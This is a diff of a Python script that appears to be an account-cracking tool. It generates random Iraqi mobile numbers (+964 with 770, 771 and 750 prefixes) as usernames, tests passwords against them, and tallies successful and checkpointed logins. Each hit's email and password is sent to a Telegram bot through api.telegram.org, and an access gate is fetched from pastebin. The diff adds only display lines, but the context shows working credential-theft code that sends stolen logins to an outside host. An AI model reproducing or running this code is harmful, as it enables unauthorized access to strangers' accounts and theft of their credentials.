@@ -56,6 +56,7 @@ def aa(s):
         sleep(50. / 700)
 
 def log():
+    os.system("clear")
     re = requests.get('https://pastebin.com/raw/KF4qk5zi')
     print(logo)
     print(" Bo Daxl Bun >> SCRIPT << Password Leda ")
@@ -108,6 +109,7 @@ def main():
     Sk = 0
 
     while True:
+        print(logo2)
         user = str(''.join((random.choice(new) for i in range(7))))
         q = '+964'
         x = '770'
@@ -148,6 +150,7 @@ def main():
             Sk += 1
             r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. T E S T E D 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @qan4s")
             
+            print(logo2)
             user = str(''.join((random.choice(new) for i in range(7))))
             q = '+964'
             x = '771'
@@ -187,6 +190,7 @@ def main():
                 Sk += 1
                 r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. T E S T E D 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @qan4s")
                 
+                print(logo2)
                 user = str(''.join((random.choice(new) for i in range(7))))
             q = '+964'
             x = '750'
